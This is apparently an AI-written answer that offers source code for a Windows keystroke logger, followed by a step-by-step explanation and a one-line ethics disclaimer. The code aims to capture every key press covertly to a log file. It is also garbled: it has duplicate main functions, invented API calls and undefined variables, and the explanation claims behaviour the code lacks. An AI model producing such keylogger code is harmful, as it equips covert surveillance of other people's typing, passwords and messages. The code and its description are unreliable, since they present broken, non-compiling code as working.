### Keystroke Logger Code (C)

```c
// Include necessary headers
#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>

using namespace std;

// Define constants
#define HOOK_ID 0
#define FILE_NAME "keystroke.log"
#define SLEEP_TIME 100  // milliseconds to prevent high CPU usage

// Initialize variables
HHOOK hook;
ofstream file(FILE_NAME, ion_out);

// Function to check if a key is pressed
bool isKeyDown(int key, int modifiers) {
    return (GetKeyState(key) & modifiers) != 0;
}

// Function to record keystroke
void recordKeystroke(int key, int time) {
    file << "Time: " << time << " - Key: " << key << endl;
}

// Set up the hook
int main() {
    // Initialize hook
    hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);

    // Check if hook was installed successfully
    if (hook == 0) {
        cout << "Keyboard hook failed to install!" << endl;
        return 1;
    }

    // Loop to capture keystrokes
    while (true) {
        // Check if the hook is still active
        if (GetLastError() != 0) {
            cout << "Keyboard hook failed: " << GetLastError() << endl;
            break;
        }

        // Capture key events
        for (int key = 0; key <= 0xFF; ++key) {
            if (isKeyDown(key, (key == 0xFF ? 0x1 : 0))) {
                // Check if key is pressed down
                if (GetKeyState(key) & MK_DOWN) {
                    int time = time(nullptr);
                    recordKeystroke(key, time);
                }
            }
        }

        // Sleep to prevent high CPU usage
        Sleep(SLEEP_TIME);
    }

    // Clean up and remove hook
    UnhookKeyboard(hook);
    file.close();
    return 0;
}

// Callback function for keyboard events
LRESULT CALLBACK keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    return CallNextHook(nCode, wParam, lParam);
}

// Main program execution
int main(int argc, char** argv) {
    // Change to current user's directory to avoid path issues
    string currentDir = getenv("USERPROFILE");
    if (!currentDir.empty()) {
        chdir(currentDir);
    }

    // Enable the keyboard hook
    hook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);

    // Start the loop
    while (true) {
        // Disable full screen hook detection
        HWND hwnd = GetForegroundWindow();
        RECT windowRect = {0, 0, 0, 0};
        if (hWnd) {
            GetWindowRect(hwnd, &windowRect);
        }

        // Sleep to prevent high CPU usage
        Sleep(SLEEP_TIME);

        // Check if the window is not maximized or if something changed
        if (windowRect.right != GetWindowRect(hwnd, &windowRect)) {
            // Re-enable full screen detection
            ShowWindow(hwnd, SW_RESTORE);
        }
    }
}
```

### Explanation:
1. **Initialization**: The code includes necessary headers and defines constants. It initializes the keystroke logging file and sets up the keyboard hook using `SetWindowsHook`.

2. **Key Check Function**: `isKeyDown` checks if a key is pressed along with any modifiers (Shift, Ctrl, Alt).

3. **Keystroke Recording**: The `recordKeystroke` function logs each key press to a file with a timestamp.

4. **Hook Setup and Loop**: The main function sets up the hook, checks for key presses, and logs them. It includes a loop to continuously monitor keystrokes and a sleep to optimize performance.

5. **Hook Cleanup**: The hook is removed, and the file is closed when the program exits.

6. **Ethical Considerations**: The code should only be used ethically with proper authorization. It's important to respect user privacy and security.

